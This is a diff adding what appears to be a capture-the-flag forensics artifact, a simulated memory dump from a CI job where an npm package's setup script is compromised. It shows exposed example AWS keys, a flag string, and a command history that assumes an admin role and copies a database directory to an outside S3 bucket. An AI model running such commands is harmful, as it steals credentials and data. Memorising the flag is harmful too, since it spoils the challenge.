@@ -1,0 +1,31 @@
+
+=== Memory Dump Analysis ===
+Process: node (PID: 1337)
+Command: node scripts/setup.js
+
+Environment Variables:
+HOME=/home/ci-user
+PATH=/usr/local/bin:/usr/bin:/bin
+AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
+AWS_SECRET_ACCESS_KEY=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
+AWS_DEFAULT_REGION=us-east-1
+CI=true
+NPM_TOKEN=npm_xxxxxxxxxxxxxxxxxxx
+
+Heap Memory Regions:
+0x7f8a4c000000: cloud-logger-utils initialization
+0x7f8a4c001000: Buffer: "eyJoIjoiY2ktYnVpbGRlci0wMSIsImUiOnsiQVdTX0F...
+0x7f8a4c002000: String: "api.legitimate-cdn.net/v2/analytics"
+
+Stack Trace:
+  at execSync (child_process.js:598)
+  at setup (/home/ci-user/node_modules/cloud-logger-utils/scripts/setup.js:24)
+
+Decoded Command History:
+$ echo 'CTF{Supply_Ch4in_Compr0m1se_D3t3ct3d}' > /tmp/.flag.txt
+$ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole
+$ aws s3 cp /var/app/database/ s3://backup-logs-temp/ --recursive
+
+Network Connections:
+185.220.101.47:443 ESTABLISHED
+52.94.76.2:443 ESTABLISHED
